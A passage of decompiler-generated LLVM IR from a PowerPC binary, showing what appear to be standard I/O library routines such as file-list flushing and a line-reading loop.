dec_label_pc_10006a80:                            ; preds = %dec_label_pc_10006a3c
  %v1_10006a64 = trunc i32 %v0_10006a60 to i8
  store i32 268462724, i32* @lr, align 4
  %v6_10006a80 = call i32 @function_10006ecc(i8 %v1_10006a64, i32 %v0_10006a54, i32 %v3_10006a54)
  store i32 %v6_10006a80, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10006a88

dec_label_pc_10006a88:                            ; preds = %dec_label_pc_10006a74, %dec_label_pc_10006a80
  store i32 %v2_10006a40, i32* @r3, align 4
  %v0_10006a90 = call i32 @function_100091fc()
  br label %dec_label_pc_10006a94

dec_label_pc_10006a94:                            ; preds = %dec_label_pc_10006a30, %dec_label_pc_10006a24, %dec_label_pc_10006a88
  %v0_10006a98 = load i32, i32* %r30.global-to-local, align 4
  ret i32 %v0_10006a98

; uselistorder directives
  uselistorder i32 %v0_10006a60, { 2, 1, 0 }
  uselistorder i32 %v3_10006a54, { 0, 3, 1, 2 }
  uselistorder i32 %v0_10006a54, { 1, 0, 2 }
  uselistorder i32 %v3_10006a0c, { 0, 3, 1, 2 }
  uselistorder i32 %v1_100069ec, { 1, 0, 2 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 (i8, i32, i32)* @function_10006ecc, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 4, 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10006a94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006a88, { 1, 0 }
}

define i32 @function_10006aac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10006aac:
  %r29.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10006ab4 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %v0_10006ab4, i32* %r29.global-to-local, align 4
  %v2_10006ad4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006ad4, i32* @r3, align 4
  %v1_10006ad8 = add i32 %arg2, 52
  %v2_10006ad8 = inttoptr i32 %v1_10006ad8 to i32*
  %v3_10006ad8 = load i32, i32* %v2_10006ad8, align 4
  %v3_10006ae4 = icmp eq i32 %v3_10006ad8, 0
  store i1 %v3_10006ae4, i1* @cr4_eq, align 1
  br i1 %v3_10006ae4, label %dec_label_pc_10006aec, label %dec_label_pc_10006af8

dec_label_pc_10006aec:                            ; preds = %dec_label_pc_10006aac
  %v0_10006aec = call i32 @function_100091fc()
  %v0_10006af4 = call i32 @function_100091f4()
  %v0_10006af8.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10006afc.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10006af8

dec_label_pc_10006af8:                            ; preds = %dec_label_pc_10006aac, %dec_label_pc_10006aec
  %v0_10006afc = phi i32 [ %v0_10006ab4, %dec_label_pc_10006aac ], [ %v0_10006afc.pre, %dec_label_pc_10006aec ]
  %v0_10006af8 = phi i32 [ %arg2, %dec_label_pc_10006aac ], [ %v0_10006af8.pre, %dec_label_pc_10006aec ]
  store i32 268462852, i32* @lr, align 4
  %v2_10006b00 = call i32 @function_10006ff0(i32 %v0_10006afc, i32 %v0_10006af8)
  store i32 %v2_10006b00, i32* %r31.global-to-local, align 4
  store i32 %v2_10006ad4, i32* @r3, align 4
  %v0_10006b10 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_10006b10, label %dec_label_pc_10006b14, label %dec_label_pc_10006b18

dec_label_pc_10006b14:                            ; preds = %dec_label_pc_10006af8
  %v0_10006b14 = call i32 @function_100091fc()
  %v0_10006b1c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10006b18

dec_label_pc_10006b18:                            ; preds = %dec_label_pc_10006af8, %dec_label_pc_10006b14
  %v0_10006b1c = phi i32 [ %v2_10006b00, %dec_label_pc_10006af8 ], [ %v0_10006b1c.pre, %dec_label_pc_10006b14 ]
  %v1_10006b30 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10006ab4)
  ret i32 %v0_10006b1c

; uselistorder directives
  uselistorder i32 %v0_10006ab4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @function_10006ff0, { 1, 0 }
  uselistorder label %dec_label_pc_10006b18, { 1, 0 }
  uselistorder label %dec_label_pc_10006af8, { 1, 0 }
}

define i32 @function_10006b38() local_unnamed_addr {
dec_label_pc_10006b38:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100091f4.205 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_100100fc.206 to i32), i32* @r29, align 4
  %v2_10006b5c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10006b5c, i32* @r3, align 4
  %v0_10006b64 = call i32 @function_100091fc()
  %v0_10006b6c = call i32 @function_100091f4()
  %v3_10006b74 = load i32, i32* @global_var_10010494.207, align 4
  %v3_10006b78 = icmp eq i32 %v3_10006b74, 1
  br i1 %v3_10006b78, label %dec_label_pc_10006b80, label %dec_label_pc_10006c28

dec_label_pc_10006b80:                            ; preds = %dec_label_pc_10006b38
  %v3_10006b84 = load i32, i32* @global_var_10010498.208, align 4
  %tmp7 = icmp slt i32 %v3_10006b84, 1
  br i1 %tmp7, label %dec_label_pc_10006c28, label %dec_label_pc_10006b90

dec_label_pc_10006b90:                            ; preds = %dec_label_pc_10006b80
  %v2_10006b9c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006b9c, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_10006ba8 = call i32 @function_100091fc()
  %v0_10006bb0 = call i32 @function_100091f4()
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_10010438.228 to i32*), align 4
  store i32 %storemerge8, i32* @r29, align 4
  %v3_10006c0811 = icmp eq i32 %storemerge8, 0
  %v0_10006c0c12 = load i32, i32* @r30, align 4
  br i1 %v3_10006c0811, label %dec_label_pc_10006c14, label %dec_label_pc_10006bc0

dec_label_pc_10006bc0:                            ; preds = %dec_label_pc_10006b90, %dec_label_pc_10006c08.backedge
  %v0_10006c0c17 = phi i32 [ %v0_10006c0c, %dec_label_pc_10006c08.backedge ], [ %v0_10006c0c12, %dec_label_pc_10006b90 ]
  %v3_10006c0c18.in = phi i32 [ %v0_10006c0c, %dec_label_pc_10006c08.backedge ], [ %v0_10006c0c12, %dec_label_pc_10006b90 ]
  %storemerge16 = phi i32 [ %storemerge, %dec_label_pc_10006c08.backedge ], [ %storemerge8, %dec_label_pc_10006b90 ]
  %v1_10006bc0 = inttoptr i32 %storemerge16 to i16*
  %v2_10006bc0 = load i16, i16* %v1_10006bc0, align 2
  %v1_10006bc4 = add i32 %storemerge16, 32
  %v2_10006bc4 = inttoptr i32 %v1_10006bc4 to i32*
  %v3_10006bc4 = load i32, i32* %v2_10006bc4, align 4
  store i32 %v3_10006bc4, i32* @r31, align 4
  %v1_10006bc8 = and i16 %v2_10006bc0, -32720
  %v3_10006bcc = icmp eq i16 %v1_10006bc8, 48
  br i1 %v3_10006bcc, label %dec_label_pc_10006bdc, label %dec_label_pc_10006bd4

dec_label_pc_10006bd4:                            ; preds = %dec_label_pc_10006bc0
  store i32 %storemerge16, i32* @r30, align 4
  br label %dec_label_pc_10006c08.backedge

dec_label_pc_10006bdc:                            ; preds = %dec_label_pc_10006bc0
  %v3_10006c0c18 = icmp eq i32 %v3_10006c0c18.in, 0
  br i1 %v3_10006c0c18, label %dec_label_pc_10006be0, label %dec_label_pc_10006bec

dec_label_pc_10006be0:                            ; preds = %dec_label_pc_10006bdc
  store i32 %v3_10006bc4, i32* bitcast (i32** @global_var_10010438.228 to i32*), align 4
  br label %dec_label_pc_10006bf0

dec_label_pc_10006bec:                            ; preds = %dec_label_pc_10006bdc
  %v2_10006bec = add i32 %v0_10006c0c17, 32
  %v3_10006bec = inttoptr i32 %v2_10006bec to i32*
  store i32 %v3_10006bc4, i32* %v3_10006bec, align 4
  %v0_10006bf0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10006bf0

dec_label_pc_10006bf0:                            ; preds = %dec_label_pc_10006be0, %dec_label_pc_10006bec
  %v0_10006bf0 = phi i32 [ %storemerge16, %dec_label_pc_10006be0 ], [ %v0_10006bf0.pre, %dec_label_pc_10006bec ]
  %v1_10006bf0 = inttoptr i32 %v0_10006bf0 to i16*
  %v2_10006bf0 = load i16, i16* %v1_10006bf0, align 2
  store i32 %v0_10006bf0, i32* @r3, align 4
  %v1_10006bf8 = and i16 %v2_10006bf0, 8192
  %v3_10006bf8 = icmp eq i16 %v1_10006bf8, 0
  br i1 %v3_10006bf8, label %dec_label_pc_10006c08.backedge, label %dec_label_pc_10006c00

dec_label_pc_10006c08.backedge:                   ; preds = %dec_label_pc_10006bf0, %dec_label_pc_10006bd4, %dec_label_pc_10006c00
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_10006c08 = icmp eq i32 %storemerge, 0
  %v0_10006c0c = load i32, i32* @r30, align 4
  br i1 %v3_10006c08, label %dec_label_pc_10006c14, label %dec_label_pc_10006bc0

dec_label_pc_10006c00:                            ; preds = %dec_label_pc_10006bf0
  store i32 268463108, i32* @lr, align 4
  %v0_10006c00 = call i32 @function_100081f4()
  br label %dec_label_pc_10006c08.backedge

dec_label_pc_10006c14:                            ; preds = %dec_label_pc_10006c08.backedge, %dec_label_pc_10006b90
  store i32 %v2_10006b9c, i32* @r3, align 4
  %v0_10006c1c = call i32 @function_100091fc()
  %v0_10006c24 = load i32, i32* @r29, align 4
  store i32 %v0_10006c24, i32* @global_var_10010498.208, align 4
  %v3_10006c30.pre = load i32, i32* @global_var_10010494.207, align 4
  br label %dec_label_pc_10006c28

dec_label_pc_10006c28:                            ; preds = %dec_label_pc_10006b38, %dec_label_pc_10006b80, %dec_label_pc_10006c14
  %v3_10006c30 = phi i32 [ %v3_10006b74, %dec_label_pc_10006b38 ], [ 1, %dec_label_pc_10006b80 ], [ %v3_10006c30.pre, %dec_label_pc_10006c14 ]
  store i32 %v2_10006b5c, i32* @r3, align 4
  %v1_10006c38 = add i32 %v3_10006c30, -1
  store i32 %v1_10006c38, i32* @global_var_10010494.207, align 4
  %v0_10006c40 = call i32 @function_100091fc()
  ret i32 %v0_10006c40

; uselistorder directives
  uselistorder i32 %v0_10006c0c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10006bf0, { 1, 0 }
  uselistorder i32 %v3_10006bc4, { 1, 0, 2 }
  uselistorder i32 %storemerge16, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10006c28, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006c08.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006bf0, { 1, 0 }
  uselistorder label %dec_label_pc_10006bc0, { 1, 0 }
}

define i32 @function_10006c58(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10006c58:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_10010438.228 to i32), i32* %r9.global-to-local, align 4
  %v5_10006c68 = icmp eq i16* %arg1, bitcast (i32** @global_var_10010438.228 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_10006c68, label %dec_label_pc_10006c8c, label %dec_label_pc_10006c80

dec_label_pc_10006c80:                            ; preds = %dec_label_pc_10006c58
  %v4_10006c80 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_10006c80, label %dec_label_pc_10006c8c, label %dec_label_pc_10006db8

dec_label_pc_10006c8c:                            ; preds = %dec_label_pc_10006c80, %dec_label_pc_10006c58
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100091f4.205 to i32), i32* @r30, align 4
  %v2_10006c98 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006c98, i32* @r3, align 4
  %v0_10006cac = call i32 @function_100091fc()
  %v0_10006cb4 = call i32 @function_100091f4()
  %v3_10006cbc = load i32, i32* @global_var_10010494.207, align 4
  store i32 %v2_10006c98, i32* @r3, align 4
  %v1_10006cd0 = add i32 %v3_10006cbc, 1
  store i32 %v1_10006cd0, i32* %r9.global-to-local, align 4
  store i32 %v1_10006cd0, i32* @global_var_10010494.207, align 4
  %v0_10006cd8 = call i32 @function_100091fc()
  store i32 %v2_10006c98, i32* @r3, align 4
  %v0_10006ce8 = call i32 @function_100091fc()
  %v0_10006cf0 = call i32 @function_100091f4()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_10006cf8 = load i32, i32* bitcast (i32** @global_var_10010438.228 to i32*), align 4
  store i32 %v3_10006cf8, i32* @r31, align 4
  store i32 %v2_10006c98, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  %v0_10006d08 = call i32 @function_100091fc()
  %v0_10006da8.pr = load i32, i32* @r31, align 4
  %v3_10006da83 = icmp eq i32 %v0_10006da8.pr, 0
  br i1 %v3_10006da83, label %dec_label_pc_10006db0, label %dec_label_pc_10006d10

dec_label_pc_10006d10:                            ; preds = %dec_label_pc_10006c8c, %dec_label_pc_10006da4
  %v0_10006d2c = phi i32 [ %v3_10006da4, %dec_label_pc_10006da4 ], [ %v0_10006da8.pr, %dec_label_pc_10006c8c ]
  %v1_10006d10 = inttoptr i32 %v0_10006d2c to i16*
  %v2_10006d10 = load i16, i16* %v1_10006d10, align 2
  %v3_10006d10 = zext i16 %v2_10006d10 to i32
  %v1_10006d14 = and i32 %v3_10006d10, 64
  store i32 %v1_10006d14, i32* %r9.global-to-local, align 4
  %v3_10006d14 = icmp eq i32 %v1_10006d14, 0
  br i1 %v3_10006d14, label %dec_label_pc_10006da4, label %dec_label_pc_10006d1c

dec_label_pc_10006d1c:                            ; preds = %dec_label_pc_10006d10
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_10006d20 = load i32, i32* @global_var_1001043c.226, align 4
  %v3_10006d24 = icmp eq i32 %v3_10006d20, 2
  br i1 %v3_10006d24, label %dec_label_pc_10006d48, label %dec_label_pc_10006d2c

dec_label_pc_10006d2c:                            ; preds = %dec_label_pc_10006d1c
  store i32 %v2_10006c98, i32* @r3, align 4
  %v0_10006d3c = call i32 @function_100091fc()
  %v0_10006d44 = call i32 @function_100091f4()
  %v0_10006d48.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006d48

dec_label_pc_10006d48:                            ; preds = %dec_label_pc_10006d1c, %dec_label_pc_10006d2c
  %v0_10006d5c = phi i32 [ %v0_10006d2c, %dec_label_pc_10006d1c ], [ %v0_10006d48.pre, %dec_label_pc_10006d2c ]
  %v1_10006d48 = inttoptr i32 %v0_10006d5c to i16*
  %v2_10006d48 = load i16, i16* %v1_10006d48, align 2
  %v3_10006d48 = zext i16 %v2_10006d48 to i32
  %v0_10006d4c = load i32, i32* @r27, align 4
  %v2_10006d4c = or i32 %v0_10006d4c, %v3_10006d48
  %v1_10006d50 = and i32 %v2_10006d4c, 832
  %v1_10006d54 = xor i32 %v1_10006d50, 320
  store i32 %v1_10006d54, i32* %r9.global-to-local, align 4
  %v3_10006d54 = icmp eq i32 %v1_10006d54, 0
  br i1 %v3_10006d54, label %dec_label_pc_10006d5c, label %dec_label_pc_10006d88

dec_label_pc_10006d5c:                            ; preds = %dec_label_pc_10006d48
  store i32 %v0_10006d5c, i32* @r3, align 4
  store i32 268463460, i32* @lr, align 4
  %v0_10006d60 = call i32 @function_10005838()
  %v3_10006d64 = icmp eq i32 %v0_10006d60, 0
  br i1 %v3_10006d64, label %dec_label_pc_10006d74, label %dec_label_pc_10006d6c

dec_label_pc_10006d6c:                            ; preds = %dec_label_pc_10006d5c
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10006d88

dec_label_pc_10006d74:                            ; preds = %dec_label_pc_10006d5c
  %v0_10006d74 = load i32, i32* @r31, align 4
  %v1_10006d74 = inttoptr i32 %v0_10006d74 to i16*
  %v2_10006d74 = load i16, i16* %v1_10006d74, align 2
  %v3_10006d74 = zext i16 %v2_10006d74 to i32
  %v1_10006d78 = add i32 %v0_10006d74, 8
  %v2_10006d78 = inttoptr i32 %v1_10006d78 to i32*
  %v3_10006d78 = load i32, i32* %v2_10006d78, align 4
  store i32 %v3_10006d78, i32* %r9.global-to-local, align 4
  %v1_10006d7c = call i32 @__asm_rlwinm(i32 %v3_10006d74, i32 0, i32 26, i32 24)
  %v2_10006d7c = trunc i32 %v1_10006d7c to i16
  %v1_10006d80 = load i32, i32* @r31, align 4
  %v2_10006d80 = add i32 %v1_10006d80, 28
  %v3_10006d80 = inttoptr i32 %v2_10006d80 to i32*
  store i32 %v3_10006d78, i32* %v3_10006d80, align 4
  %v3_10006d84 = load i32, i32* @r31, align 4
  %v4_10006d84 = inttoptr i32 %v3_10006d84 to i16*
  store i16 %v2_10006d7c, i16* %v4_10006d84, align 2
  br label %dec_label_pc_10006d88

dec_label_pc_10006d88:                            ; preds = %dec_label_pc_10006d48, %dec_label_pc_10006d6c, %dec_label_pc_10006d74
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_10006d8c = load i32, i32* @global_var_1001043c.226, align 4
  %v3_10006d90 = icmp eq i32 %v3_10006d8c, 2
  br i1 %v3_10006d90, label %dec_label_pc_10006da4, label %dec_label_pc_10006d98

dec_label_pc_10006d98:                            ; preds = %dec_label_pc_10006d88
  store i32 %v2_10006c98, i32* @r3, align 4
  %v0_10006da0 = call i32 @function_100091fc()
  br label %dec_label_pc_10006da4

dec_label_pc_10006da4:                            ; preds = %dec_label_pc_10006d88, %dec_label_pc_10006d10, %dec_label_pc_10006d98
  %v0_10006da4 = load i32, i32* @r31, align 4
  %v1_10006da4 = add i32 %v0_10006da4, 32
  %v2_10006da4 = inttoptr i32 %v1_10006da4 to i32*
  %v3_10006da4 = load i32, i32* %v2_10006da4, align 4
  store i32 %v3_10006da4, i32* @r31, align 4
  %v3_10006da8 = icmp eq i32 %v3_10006da4, 0
  br i1 %v3_10006da8, label %dec_label_pc_10006db0, label %dec_label_pc_10006d10

dec_label_pc_10006db0:                            ; preds = %dec_label_pc_10006da4, %dec_label_pc_10006c8c
  store i32 ptrtoint (i32* @global_var_10006db4.253 to i32), i32* @lr, align 4
  %v0_10006db0 = call i32 @function_10006b38()
  br label %dec_label_pc_10006df0

dec_label_pc_10006db8:                            ; preds = %dec_label_pc_10006c80
  %v3_10006db8 = load i16, i16* %arg1, align 2
  %v4_10006db8 = zext i16 %v3_10006db8 to i32
  store i32 0, i32* @r28, align 4
  %v1_10006dc0 = and i32 %v4_10006db8, 64
  store i32 %v1_10006dc0, i32* %r9.global-to-local, align 4
  %v3_10006dc0 = icmp eq i32 %v1_10006dc0, 0
  br i1 %v3_10006dc0, label %dec_label_pc_10006df0, label %dec_label_pc_10006dc8

dec_label_pc_10006dc8:                            ; preds = %dec_label_pc_10006db8
  store i32 268463564, i32* @lr, align 4
  %v0_10006dc8 = call i32 @function_10005838()
  store i32 -1, i32* @r28, align 4
  %v3_10006dd0 = icmp eq i32 %v0_10006dc8, 0
  br i1 %v3_10006dd0, label %dec_label_pc_10006dd8, label %dec_label_pc_10006df0

dec_label_pc_10006dd8:                            ; preds = %dec_label_pc_10006dc8
  %v0_10006dd8 = load i32, i32* @r29, align 4
  %v1_10006dd8 = inttoptr i32 %v0_10006dd8 to i16*
  %v2_10006dd8 = load i16, i16* %v1_10006dd8, align 2
  %v3_10006dd8 = zext i16 %v2_10006dd8 to i32
  store i32 0, i32* @r28, align 4
  %v1_10006de0 = add i32 %v0_10006dd8, 8
  %v2_10006de0 = inttoptr i32 %v1_10006de0 to i32*
  %v3_10006de0 = load i32, i32* %v2_10006de0, align 4
  store i32 %v3_10006de0, i32* %r9.global-to-local, align 4
  %v1_10006de4 = call i32 @__asm_rlwinm(i32 %v3_10006dd8, i32 0, i32 26, i32 24)
  %v2_10006de4 = trunc i32 %v1_10006de4 to i16
  %v3_10006de8 = load i32, i32* @r29, align 4
  %v4_10006de8 = inttoptr i32 %v3_10006de8 to i16*
  store i16 %v2_10006de4, i16* %v4_10006de8, align 2
  %v0_10006dec = load i32, i32* %r9.global-to-local, align 4
  %v1_10006dec = load i32, i32* @r29, align 4
  %v2_10006dec = add i32 %v1_10006dec, 28
  %v3_10006dec = inttoptr i32 %v2_10006dec to i32*
  store i32 %v0_10006dec, i32* %v3_10006dec, align 4
  br label %dec_label_pc_10006df0

dec_label_pc_10006df0:                            ; preds = %dec_label_pc_10006dc8, %dec_label_pc_10006db8, %dec_label_pc_10006db0, %dec_label_pc_10006dd8
  %v0_10006df4 = load i32, i32* @r28, align 4
  ret i32 %v0_10006df4

; uselistorder directives
  uselistorder i32 %v3_10006da4, { 1, 2, 0 }
  uselistorder i32 %v1_10006d54, { 1, 0 }
  uselistorder i32 %v2_10006c98, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32 ()* @function_10006b38, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_10010438.228 to i32*), { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32* @global_var_10010494.207, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i16* %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10006df0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10006da4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006d88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006d48, { 1, 0 }
  uselistorder label %dec_label_pc_10006d10, { 1, 0 }
}

define i32 @function_10006e08(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10006e08:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_10006eb0, label %dec_label_pc_10006e28

dec_label_pc_10006e28:                            ; preds = %dec_label_pc_10006e08
  store i32 %tmp, i32* @r31, align 4
  %v2_10006e903 = add i32 %arg2, -1
  store i32 %v2_10006e903, i32* @r29, align 4
  %v4_10006e989 = icmp eq i32 %arg2, 1
  br i1 %v4_10006e989, label %dec_label_pc_10006e9c, label %dec_label_pc_10006e30

dec_label_pc_10006e30:                            ; preds = %dec_label_pc_10006e28, %dec_label_pc_10006e90.backedge
  %v2_10006e4c = phi i32 [ %v2_10006e4c12, %dec_label_pc_10006e90.backedge ], [ %tmp, %dec_label_pc_10006e28 ]
  %v0_10006e30 = phi i32 [ %v0_10006e94, %dec_label_pc_10006e90.backedge ], [ %arg3, %dec_label_pc_10006e28 ]
  %v1_10006e30 = add i32 %v0_10006e30, 16
  %v2_10006e30 = inttoptr i32 %v1_10006e30 to i32*
  %v3_10006e30 = load i32, i32* %v2_10006e30, align 4
  %v1_10006e34 = add i32 %v0_10006e30, 24
  %v2_10006e34 = inttoptr i32 %v1_10006e34 to i32*
  %v3_10006e34 = load i32, i32* %v2_10006e34, align 4
  %v2_10006e38 = add i32 %v3_10006e30, 1
  store i32 %v2_10006e38, i32* %r11.global-to-local, align 4
  %v3_10006e3c = icmp ult i32 %v3_10006e30, %v3_10006e34
  %v5_10006e3c = icmp eq i32 %v3_10006e30, %v3_10006e34
  store i1 %v5_10006e3c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006e3c, label %dec_label_pc_10006e44, label %dec_label_pc_10006e60

dec_label_pc_10006e44:                            ; preds = %dec_label_pc_10006e30
  %v4_10006e30 = inttoptr i32 %v3_10006e30 to i8*
  %v3_10006e44 = load i8, i8* %v4_10006e30, align 1
  %v3_10006e48 = icmp eq i8 %v3_10006e44, 10
  store i1 %v3_10006e48, i1* %cr7_eq.global-to-local, align 1
  %v3_10006e4c = inttoptr i32 %v2_10006e4c to i8*
  store i8 %v3_10006e44, i8* %v3_10006e4c, align 1
  %v0_10006e50 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006e50 = load i32, i32* @r30, align 4
  %v2_10006e50 = add i32 %v1_10006e50, 16
  %v3_10006e50 = inttoptr i32 %v2_10006e50 to i32*
  store i32 %v0_10006e50, i32* %v3_10006e50, align 4
  %v0_10006e54 = load i32, i32* @r31, align 4
  %v1_10006e54 = add i32 %v0_10006e54, 1
  store i32 %v1_10006e54, i32* @r31, align 4
  %v0_10006e58 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10006e58, label %dec_label_pc_10006e9c, label %dec_label_pc_10006e90.backedge

dec_label_pc_10006e60:                            ; preds = %dec_label_pc_10006e30
  %v1_10006e9410 = inttoptr i32 %v0_10006e30 to i16*
  store i32 268463716, i32* @lr, align 4
  %v5_10006e60 = call i32 @function_1000a830(i16* %v1_10006e9410, i32 %v3_10006e30)
  %v6_10006e60 = trunc i32 %v5_10006e60 to i8
  %v4_10006e64 = icmp eq i8 %v6_10006e60, -1
  store i1 %v4_10006e64, i1* %cr7_eq.global-to-local, align 1
  %v3_10006e6c = icmp eq i8 %v6_10006e60, 10
  store i1 %v3_10006e6c, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10006e64, label %dec_label_pc_10006e74, label %dec_label_pc_10006e84

dec_label_pc_10006e74:                            ; preds = %dec_label_pc_10006e60
  %v0_10006e74 = load i32, i32* @r30, align 4
  %v1_10006e74 = inttoptr i32 %v0_10006e74 to i16*
  %v2_10006e74 = load i16, i16* %v1_10006e74, align 2
  %v1_10006e78 = and i16 %v2_10006e74, 8
  %v3_10006e78 = icmp eq i16 %v1_10006e78, 0
  br i1 %v3_10006e78, label %dec_label_pc_10006e74.dec_label_pc_10006e9c_crit_edge, label %dec_label_pc_10006eb0

dec_label_pc_10006e74.dec_label_pc_10006e9c_crit_edge: ; preds = %dec_label_pc_10006e74
  %v0_10006e9c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006e9c

dec_label_pc_10006e84:                            ; preds = %dec_label_pc_10006e60
  %v3_10006e84 = load i32, i32* @r31, align 4
  %v4_10006e84 = inttoptr i32 %v3_10006e84 to i8*
  store i8 %v6_10006e60, i8* %v4_10006e84, align 1
  %v0_10006e88 = load i32, i32* @r31, align 4
  %v1_10006e88 = add i32 %v0_10006e88, 1
  store i32 %v1_10006e88, i32* @r31, align 4
  %v0_10006e8c = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10006e8c, label %dec_label_pc_10006e9c, label %dec_label_pc_10006e90.backedge

dec_label_pc_10006e90.backedge:                   ; preds = %dec_label_pc_10006e84, %dec_label_pc_10006e44
  %v2_10006e4c12 = phi i32 [ %v1_10006e88, %dec_label_pc_10006e84 ], [ %v1_10006e54, %dec_label_pc_10006e44 ]
  %v0_10006e90 = load i32, i32* @r29, align 4
  %v2_10006e90 = add i32 %v0_10006e90, -1
  store i32 %v2_10006e90, i32* @r29, align 4
  %v0_10006e94 = load i32, i32* @r30, align 4
  %v4_10006e98 = icmp eq i32 %v0_10006e90, 1
  br i1 %v4_10006e98, label %dec_label_pc_10006e9c, label %dec_label_pc_10006e30

dec_label_pc_10006e9c:                            ; preds = %dec_label_pc_10006e84, %dec_label_pc_10006e90.backedge, %dec_label_pc_10006e44, %dec_label_pc_10006e28, %dec_label_pc_10006e74.dec_label_pc_10006e9c_crit_edge
  %v2_10006ea8 = phi i32 [ %v0_10006e9c.pre, %dec_label_pc_10006e74.dec_label_pc_10006e9c_crit_edge ], [ %tmp, %dec_label_pc_10006e28 ], [ %v1_10006e54, %dec_label_pc_10006e44 ], [ %v2_10006e4c12, %dec_label_pc_10006e90.backedge ], [ %v1_10006e88, %dec_label_pc_10006e84 ]
  %v1_10006e9c = load i32, i32* @r28, align 4
  %v3_10006e9c = icmp ugt i32 %v2_10006ea8, %v1_10006e9c
  %v4_10006e9c = icmp eq i32 %v2_10006ea8, %v1_10006e9c
  store i1 %v4_10006e9c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006e9c, label %dec_label_pc_10006ea4, label %dec_label_pc_10006eb0

dec_label_pc_10006ea4:                            ; preds = %dec_label_pc_10006e9c
  %v3_10006ea8 = inttoptr i32 %v2_10006ea8 to i8*
  store i8 0, i8* %v3_10006ea8, align 1
  %v0_10006eb8.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10006eb4

dec_label_pc_10006eb0:                            ; preds = %dec_label_pc_10006e74, %dec_label_pc_10006e9c, %dec_label_pc_10006e08
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10006eb4

dec_label_pc_10006eb4:                            ; preds = %dec_label_pc_10006ea4, %dec_label_pc_10006eb0
  %v0_10006eb8 = phi i32 [ %v0_10006eb8.pre, %dec_label_pc_10006ea4 ], [ 0, %dec_label_pc_10006eb0 ]
  ret i32 %v0_10006eb8

; uselistorder directives
  uselistorder i32 %v2_10006ea8, { 0, 2, 1 }
  uselistorder i8 %v6_10006e60, { 1, 0, 2 }
  uselistorder i32 %v3_10006e34, { 1, 0 }
  uselistorder i32 %v3_10006e30, { 0, 4, 1, 2, 3 }
